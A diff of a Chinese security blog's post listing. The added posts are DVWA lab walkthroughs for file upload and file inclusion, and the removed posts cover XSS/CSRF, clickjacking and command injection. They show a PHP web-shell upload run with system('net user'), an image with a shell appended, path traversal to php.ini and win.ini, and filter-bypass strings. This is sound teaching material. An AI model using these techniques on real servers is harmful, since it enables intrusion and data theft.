+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giun">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/14/file-upload/" class="post-title-link" itemprop="url">file upload</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-14 15:54:14 / 修改时间：15:57:47" itemprop="dateCreated datePublished" datetime="2019-03-14T15:54:14+08:00">2019-03-14</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/bugkuCTF/" itemprop="url" rel="index"><span itemprop="name">bugkuCTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><img src="/2019/03/14/file-upload/1.jpg" alt="在这里插入图片描述"></p>
+<h2 id="一、尝试low等级"><a href="#一、尝试low等级" class="headerlink" title="一、尝试low等级"></a>一、尝试low等级</h2><p>我们上传一个phpinfo.php文件，文件内容为<code>&lt;?php echo pphpinfo()?&gt;</code>,<br><img src="/2019/03/14/file-upload/2.jpg" alt="在这里插入图片描述"><br>把路径拼接起来，输入</p>
+<pre><code>http://localhost/DVWA/hackable/uploads/phpinfo.php
+</code></pre><p>成功获得执行我们上次的文件<br><img src="/2019/03/14/file-upload/3.jpg" alt="在这里插入图片描述"><br>我们再上传个一句话木马文件<br>然后直接尝试系统命令</p>
+<pre><code>http://localhost/DVWA/hackable/uploads/cmd.php
+?cmd=system(&apos;net user&apos;);
+</code></pre><p><img src="/2019/03/14/file-upload/4.jpg" alt="在这里插入图片描述"></p>
+<h2 id="二、尝试medium等级"><a href="#二、尝试medium等级" class="headerlink" title="二、尝试medium等级"></a>二、尝试medium等级</h2><p>上传一句话木马文件，发现报错，只支持jpeg和png格式的图片<br><img src="/2019/03/14/file-upload/5.jpg" alt="在这里插入图片描述"><br>那么我们抓包看看，上传成功和上传不成功的包有什么差别，然后就是不断的尝试，不端地把上传不成功的包与上传成功的不同之处改成和上传成功的包相同，然后重新发送，发现了破解的办法<br>上传cmd.php文件，然后把文件类型改为imag/jpeg，重新发送就可以了。<br><img src="/2019/03/14/file-upload/6.jpg" alt="在这里插入图片描述"><br>三、high等级<br>前面的方法都不能用了。尝试了文件后缀名和文件内容发现都失败了<br><img src="/2019/03/14/file-upload/7.jpg" alt="在这里插入图片描述"><br>那么我们就想到了”制作内涵图“，就是把文件和图片合并成一张图片<br>在cmd窗口下用命令结合</p>
+<pre><code>copy 1.jpg/b  +1.txt/a  2.jpg
+</code></pre><p>结合成2.jpg<br>我们用编辑器打开，在文件末尾发现了我们的一句话木马<br><img src="/2019/03/14/file-upload/8.jpg" alt="在这里插入图片描述"></p>
+<p>那既然传上去了，那么我们要怎么用呢<br>首先我们需要切换下服务器，切换成nginx<br><img src="/2019/03/14/file-upload/9.jpg" alt="在这里插入图片描述"><br>在phpini配置文件里把下面这个参数改为一，默认是1<br><img src="/2019/03/14/file-upload/10.jpg" alt="在这里插入图片描述"><br>然后输入<code>http://localhost/DVWA//hackable/uploads/2.jpg/2.php</code>即可上传<br><img src="/2019/03/14/file-upload/11.jpg" alt="在这里插入图片描述"></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/14/file-includes/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wr">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giun">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/14/file-includes/" class="post-title-link" itemprop="url">file includes</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-14 15:46:13 / 修改时间：15:53:43" itemprop="dateCreated datePublished" datetime="2019-03-14T15:46:13+08:00">2019-03-14</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/bugkuCTF/" itemprop="url" rel="index"><span itemprop="name">bugkuCTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="一、前置知识"><a href="#一、前置知识" class="headerlink" title="一、前置知识"></a>一、前置知识</h2><p><strong>1、什么是文件包含</strong><br>一种代码处理方法，函数如include,require等，参数是文件名。<br><strong>2、文件包含漏洞</strong><br>文件名的参数用户可控且过滤不严，被攻击者偷梁换柱<br><img src="/2019/03/14/file-includes/1.jpg" alt="在这里插入图片描述"></p>
+<h2 id="二、尝试low等级"><a href="#二、尝试low等级" class="headerlink" title="二、尝试low等级"></a>二、尝试low等级</h2><p>打开文件包含题目会发现以下提示，我们找到php.ini配置文件（一般在安装目录里），把 allow_url_include的值改成on，然后重启phpstudy即可<br>The PHP function allow_url_include is not enabled<br><img src="/2019/03/14/file-includes/2.jpg" alt="在这里插入图片描述"><br>我们点击文件一、文件2、文件3、发现了下图的规律。<br><img src="/2019/03/14/file-includes/3.jpg" alt="在这里插入图片描述"><br>那么我们尝试下输入</p>
+<pre><code>http://localhost/DVWA/vulnerabilities/fi/?page=test.php
+</code></pre><p><img src="/2019/03/14/file-includes/4.jpg" alt="在这里插入图片描述"><br>那么我们就可以利用这个漏洞了，输入</p>
+<pre><code>http://localhost/DVWA/vulnerabilities/fi/?page=..\..\php.ini
+</code></pre><p>  <code>..\</code>的意思是返回上一级目录。因为php.ini在DVWA目录下，所以使用<code>..\..\</code><br>  直接输出了这个文件的内容<br>  <img src="/2019/03/14/file-includes/5.jpg" alt="在这里插入图片描述"><br>  <strong>那么问题又来了，读取其他目录的php脚本会怎样，显示内容还是执行php代码</strong></p>
+<p>  输入</p>
+<pre><code>http://localhost/DVWA/vulnerabilities/fi/?page=..\..\phpinfo.php
+</code></pre><p><img src="/2019/03/14/file-includes/6.jpg" alt="在这里插入图片描述"><br>  这<br>说明了文件包含不仅仅显示内容还会执行文件。</p>
+<p><strong>那什么会执行远程文件吗？</strong><br>我们再次尝试<br><img src="/2019/03/14/file-includes/7.jpg" alt="在这里插入图片描述"><br><img src="/2019/03/14/file-includes/8.jpg" alt="在这里插入图片描述"><br>可以执行并且非php文件里面只要包含php代码就可以执行 </p>
+<p><strong>那么问题又来了。远程执行php文件和非php文件有什么差别吗？</strong><br>当然有了，以上面的phpinfo.php和phpinfo.txt为例，进行说明<br>phpinfo.php是在攻击者的web服务器上执行，这毫无意义，我们期望的是在受害者的web服务器上执行，所以phpinfo.txt才是正解，（phpinfo.txt在受害者的web服务器上执行）</p>
+<h2 id="三、尝试medium等级"><a href="#三、尝试medium等级" class="headerlink" title="三、尝试medium等级"></a>三、尝试medium等级</h2><p>用low等级的方法发现依然成功。<br>但是他和low的等级有什么差别吗<br>差别在于它过滤了../而low的等级没有。<br><img src="/2019/03/14/file-includes/9.jpg" alt="在这里插入图片描述"><br><img src="/2019/03/14/file-includes/10.jpg" alt="在这里插入图片描述"><br>第一张图为low等级，第二张图为medium等级代码。<br>可以发现差别在于<a href="http://www.w3school.com.cn/php/func_string_str_replace.asp" target="_blank" rel="noopener">str_place()函数</a><br>他把我们传入的参数中的<code>../和..\&quot;</code>替换成了空。<br>还有<code>https://和http://</code>替换成了空</p>
+<p>那么medium等级的远程文件可以执行吗。<br>当然可以了<br>既然过滤了http://那么我们可以使用<code>httphttp://://</code><br>如下图<br><img src="/2019/03/14/file-includes/11.jpg" alt="在这里插入图片描述"></p>
+<h2 id="四、high等级"><a href="#四、high等级" class="headerlink" title="四、high等级"></a>四、high等级</h2><p>我们尝试了medium等级的方法，进行本地文件执行发现以下错误<br><img src="/2019/03/14/file-includes/12.jpg" alt="在这里插入图片描述"><br>经常一番尝试发现只执行以file开头的文件<br>。那么这里就不得不提到file协议了</p>
+<p><strong>那么什么是files协议呢</strong><br>就是文本传输协议，访问本地计算机中的文件</p>
+<p>输入</p>
+<pre><code>http://localhost/DVWA/vulnerabilities/fi/?page=file://F:\php\PHPTutorial\WWW\DVWA\phpinfo.php
+</code></pre><p>file://后面是本地路径，成功执行本地文件<br><img src="/2019/03/14/file-includes/13.jpg" alt="在这里插入图片描述"><br>也可以查看系统文件</p>
+<pre><code>http://localhost/DVWA/vulnerabilities/fi/?page=file://C:\windows\win.ini
+</code></pre><p><img src="/2019/03/14/file-includes/14.jpg" alt="在这里插入图片描述"></p>
+<p>那么怎样进行远程文件执行呢<br>medium方法不可以，<br>查看源码，<br>可知用<a href="http://www.runoob.com/php/func-filesystem-fnmatch.html" target="_blank" rel="noopener">fnmatch()函数</a>限制参数文件的开头<br><img src="/2019/03/14/file-includes/15.jpg" alt="在这里插入图片描述"><br>进入impose等级<br><img src="/2019/03/14/file-includes/16.jpg" alt="在这里插入图片描述"><br>那么要如何远程执行呢，要就有把文件放在图片里，然后上传到web服务器，怎么把文件放在图片里这篇博客里的<a href="https://blog.csdn.net/qq_44105778/article/details/88372331" target="_blank" rel="noopener">high等级部分</a>说明了<br><img src="/2019/03/14/file-includes/17.jpg" alt="在这里插入图片描述"></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/09/Brute-Force/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1053,1175 +2263,11 @@ flag变量又在$GLOBALS中，var_dump  eval  成功得到flag
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/06/xss1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wr">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="giun">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/03/06/xss1/" class="post-title-link" itemprop="url">XSS和CSRF之介绍</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-03-06 21:41:37 / 修改时间：21:47:06" itemprop="dateCreated datePublished" datetime="2019-03-06T21:41:37+08:00">2019-03-06</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="一、什么是XSS"><a href="#一、什么是XSS" class="headerlink" title="一、什么是XSS"></a>一、什么是XSS</h2><p>全称：Cross Site Script<br>中文名称：跨站脚本<br>危害：盗取用户信息、钓鱼、制造蠕虫等</p>
-<p>概念：<br><img src="/2019/03/06/xss1/1.jpg" alt="在这里插入图片描述"></p>
-<h2 id="二、xss的分类"><a href="#二、xss的分类" class="headerlink" title="二、xss的分类"></a>二、xss的分类</h2><p><strong>1、存储型</strong><br>访问网站时，触发XSS<br>我们可以通过查看网页源代码的方式查看xss的触发点。</p>
-<p>我们安装irebug（F12快捷件打开），利用该火狐插件来寻找注入点。</p>
-<p>分析其攻击过程<br><img src="/2019/03/06/xss1/2.jpg" alt><br>但是xss脚本是怎样被黑客写入数据库呢<br><img src="/2019/03/06/xss1/3.jpg" alt="在这里插入图片描述"><br><strong>2、反射型</strong><br>访问携带xss脚本的连接时触发xss</p>
-<p>查看源码，寻找触发点</p>
-<p>如何产生的呢（右边为xss源码）<br><img src="/2019/03/06/xss1/4.jpg" alt="在这里插入图片描述"><br>分析攻击过程<br><img src="/2019/03/06/xss1/5.jpg" alt="在这里插入图片描述"></p>
-<p><strong>存储型xss和反射型xss的区别</strong><br>存储型xss是从数据库中提取xss的脚本内容<br>反射型xss是直接从url的内容中提取出xss的脚本的内容</p>
-<p><strong>3、DOM型</strong><br>那什么是DOM呢，就是Document Object Model,即文档对象模型，它允许脚本（js）控制web的页面、窗口和文档。简单说DOM就是就是js操作html时的API(应用程序接口)</p>
-<p>访问携带xss脚本的连接时触发xss</p>
-<p>查看源码，了解触发点</p>
-<p>分析原理<br><img src="/2019/03/06/xss1/6.jpg" alt="在这里插入图片描述"></p>
-<p><strong>DOM型xss与反射型xss很类似，但是他们有什么区别呢</strong><br>DOM型xss是通过前端javascript将xss脚本写入DOM中，触发xss</p>
-<p>反射型xss是通过后端或应用程序将xss脚本写入响应页面中，浏览器响应页面时才触发xss</p>
-<p><strong>存储型xss漏洞演示</strong></p>
-<p><img src="/2019/03/06/xss1/7.jpg" alt="在这里插入图片描述"><br>xss代码应该为<code>&lt;img src=&quot;a&quot; onerror=alert(/hhhh/)&gt;</code>，<br>用管理员员登入后台，进入留言板会触发xss,出现弹窗内容为/xxxx/</p>
-<p><strong>反射型xss漏洞演示</strong><br>我们写一个这样的脚本文件，命名为index.php</p>
-<pre><code>&lt;?php 
-header(&quot;content-type:text/html;charset=utf-8&quot;);
-if(isset($_REQUEST[&quot;name&quot;]))
-{
-     $name=$_REQUEST[&quot;name&quot;];
-}
-else{
-  $name = &quot;&quot;;
-}
-echo &quot;hhhhh &quot;.$name;
-?&gt;
-</code></pre><p>本地访问下<br><img src="/2019/03/06/xss1/8.jpg" alt="在这里插入图片描述"><br>传入参数<code>？name=&lt;img src=&quot;a&quot; onerror=alert(/hhhh/)&gt;</code><br>alert（）方法用于显示一条指定的消息和一个ok按钮的警告框<br>用qq浏览器尝试下，xss注入被浏览器拦截了，尴尬了<br><img src="/2019/03/06/xss1/9.jpg" alt="在这里插入图片描述"></p>
-<p>用火狐浏览器再次尝试，成功注入xss<br><img src="/2019/03/06/xss1/10.jpg" alt="在这里插入图片描述"><br>查看源码即可发现注入位置<br><img src="https://img-blog.csdnimg.cn/20190304112014875.png" alt="在这里插入图片描述"><br>DOM型xss漏洞这边就不演示了</p>
-<p><strong>4、小结</strong><br><img src="/2019/03/06/xss1/11.jpg" alt="在这里插入图片描述"></p>
-<h2 id="三、CSRF是什么"><a href="#三、CSRF是什么" class="headerlink" title="三、CSRF是什么"></a>三、CSRF是什么</h2><p><strong>全称</strong>：Cross-site request forgery</p>
-<p><strong>中文名称是：</strong>跨站请求伪造</p>
-<p><strong>危害</strong>：执行恶意操作（”被转账“、“被发垃圾评论”等）、制造蠕虫·······</p>
-<p><strong>概念：</strong>利用客户已经登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作</p>
-<p><strong>分析原理</strong><br><img src="/2019/03/06/xss1/12.jpg" alt="在这里插入图片描述"><br><strong>那里面恶意的网站是怎么做的呢？</strong></p>
-<p>正常情况下：<br>通常Cookie中会存放用户凭证信息<br>浏览器在发送任何请求时都会带上已有的cookie<br>通过cookie识别用户身份后，执行转账操作。</p>
-<p>黑客的操作：<br>伪造攻击代码，打开页面时自动完成转账<br><img src="/2019/03/06/xss1/13.jpg" alt="在这里插入图片描述"></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/06/Clickjacking/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wr">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="giun">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/03/06/Clickjacking/" class="post-title-link" itemprop="url">Clickjacking(点击劫持)</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-03-06 21:37:23 / 修改时间：21:40:49" itemprop="dateCreated datePublished" datetime="2019-03-06T21:37:23+08:00">2019-03-06</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="一、前置知识"><a href="#一、前置知识" class="headerlink" title="一、前置知识"></a>一、前置知识</h2><p>首先介绍下html下的iframe标签的作用：<br>可以创建包含另一个文档的内联框架。<br>例如下面这个代码。运行下面这个网页，发现他和网易安全中心的页面几乎一样，除了url不一样</p>
-<pre><code>&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;
-&lt;head&gt;
-    &lt;title&gt;网易安全中心&lt;/title&gt;
-    &lt;style &gt;
-        html,body,iframe{
-            display: block;
-            height: 100%;
-            width: 100%;
-            margin: 0;
-            padding: 0;    
-            border: none;    
-        }
-    &lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;iframe src=&quot;http://aq.163.com/module/hole/hole-submit.html&quot;&gt;&lt;/iframe&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p><img src="/2019/03/06/Clickjacking/1.jpg" alt="在这里插入图片描述"><br>案例，图片的背后是隐藏的网站。<br><img src="/2019/03/06/Clickjacking/2.jpg" alt="在这里插入图片描述"></p>
-<h2 id="二、什么是点击劫持呢"><a href="#二、什么是点击劫持呢" class="headerlink" title="二、什么是点击劫持呢"></a>二、什么是点击劫持呢</h2><p>通过覆盖不可见的框架误导受害者点击而造成的攻击行为。</p>
-<h2 id="三、点击劫持的特点"><a href="#三、点击劫持的特点" class="headerlink" title="三、点击劫持的特点"></a>三、点击劫持的特点</h2><p>1、隐蔽性高</p>
-<p>2、骗取用户操作</p>
-<p>3、UI-覆盖攻击</p>
-<p>4、利用了iframe标签或者其他标签的属性</p>
-<h2 id="四、实例分析"><a href="#四、实例分析" class="headerlink" title="四、实例分析"></a>四、实例分析</h2><p>代码如下，效果如下</p>
-<pre><code>&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;
-&lt;head&gt;
-    &lt;title&gt;点击劫持&lt;/title&gt;
-    &lt;style &gt;
-    /*设置高度、宽度*/
-        html,body,iframe{
-                display: block;
-                height: 100%;
-                width: 100%;
-                margin: 0;
-                padding: 0;    
-                border: none;
-                }
-    /*设置隐藏网页的可见度*/
-        iframe{
-            /*opacity: 0;*/
-            filter: alpha(opacity=0);/*IE*/
-            -moz-opacity:0.5;/*Moz+FF*/
-            opacity: 0.5;/*支持css3浏览器（FF1.5也支持）*/
-            position: absolute;
-            z-index: 2;/*网页的堆叠层次*/
-        }
-    /*设置按钮的位置*/
-        button{
-            position: absolute;
-            top: -70px;
-            left: 800px;
-            z-index: 1;
-            width: 72px;
-            height: 26px;
-        }    
-    &lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;button&gt;&lt;img src=&quot;3.jpg&quot;&gt;&lt;/button&gt;
-    &lt;iframe src=&quot;http://aq.163.com/module/hole/hole-submit.html&quot;&gt;&lt;/iframe&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre><p><img src="/2019/03/06/Clickjacking/3.jpg" alt="在这里插入图片描述"><br>再做次修改<br><img src="/2019/03/06/Clickjacking/4.jpg" alt="在这里插入图片描述"><br>效果，以及完全看不出背后的网易网页了。<br><img src="/2019/03/06/Clickjacking/5.jpg" alt="在这里插入图片描述"></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/06/URL/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wr">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="giun">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/03/06/URL/" class="post-title-link" itemprop="url">URL跳转、命令注入、文件操作类漏洞介绍</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-03-06 21:30:05 / 修改时间：21:36:42" itemprop="dateCreated datePublished" datetime="2019-03-06T21:30:05+08:00">2019-03-06</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="一、什么是URL跳转漏洞呢"><a href="#一、什么是URL跳转漏洞呢" class="headerlink" title="一、什么是URL跳转漏洞呢"></a>一、什么是URL跳转漏洞呢</h2><p>借助未验证的URL跳转，将应用程序引导到不安全的第三方区域，从而导致的安全问题。</p>
-<h2 id="二、实现方式"><a href="#二、实现方式" class="headerlink" title="二、实现方式"></a>二、实现方式</h2><p><strong>1、Header头跳转</strong><br>实现代码<br><img src="/2019/03/06/URL/1.jpg" alt="在这里插入图片描述"><br><strong>2、javascript跳转</strong><br>实现代码<br><img src="/2019/03/06/URL/2.jpg" alt="在这里插入图片描述"><br><strong>3、meta跳转</strong><br><img src="/2019/03/06/URL/3.jpg" alt="在这里插入图片描述"></p>
-<h2 id="三、原理分析"><a href="#三、原理分析" class="headerlink" title="三、原理分析"></a>三、原理分析</h2><p><img src="/2019/03/06/URL/4.jpg" alt="在这里插入图片描述"></p>
-<h2 id="四、什么是命令注入"><a href="#四、什么是命令注入" class="headerlink" title="四、什么是命令注入"></a>四、什么是命令注入</h2><p>系统命令注入</p>
-<h2 id="五、web应用如何注入命令"><a href="#五、web应用如何注入命令" class="headerlink" title="五、web应用如何注入命令"></a>五、web应用如何注入命令</h2><p><img src="/2019/03/06/URL/5.jpg" alt="在这里插入图片描述"><br><strong>PHP执行命令的注入</strong><br><img src="/2019/03/06/URL/6.jpg" alt="在这里插入图片描述"><br>例如<br><img src="/2019/03/06/URL/7.jpg" alt="在这里插入图片描述"><br>分析攻击过程<br><img src="/2019/03/06/URL/8.jpg" alt="在这里插入图片描述"></p>
-<h2 id="六、常见的文件操作"><a href="#六、常见的文件操作" class="headerlink" title="六、常见的文件操作"></a>六、常见的文件操作</h2><p><img src="/2019/03/06/URL/9.jpg" alt="在这里插入图片描述"></p>
-<h2 id="七、常见的文件操作漏洞"><a href="#七、常见的文件操作漏洞" class="headerlink" title="七、常见的文件操作漏洞"></a>七、常见的文件操作漏洞</h2><p><strong>1、文件上传漏洞</strong><br><img src="/2019/03/06/URL/10.jpg" alt="在这里插入图片描述"><br><strong>2、任意文件下载漏洞</strong><br><img src="/2019/03/06/URL/11.jpg" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190304194457446.png" alt="在这里插入图片描述"><br><strong>3、文件包含漏洞</strong><br><img src="/2019/03/06/URL/12.jpg" alt="在这里插入图片描述"><br>文件包含漏洞包括本地文件包含和远程文件包含<br><img src="/2019/03/06/URL/13.jpg" alt="在这里插入图片描述"></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/06/browser/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wr">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="giun">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/03/06/browser/" class="post-title-link" itemprop="url">browser</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
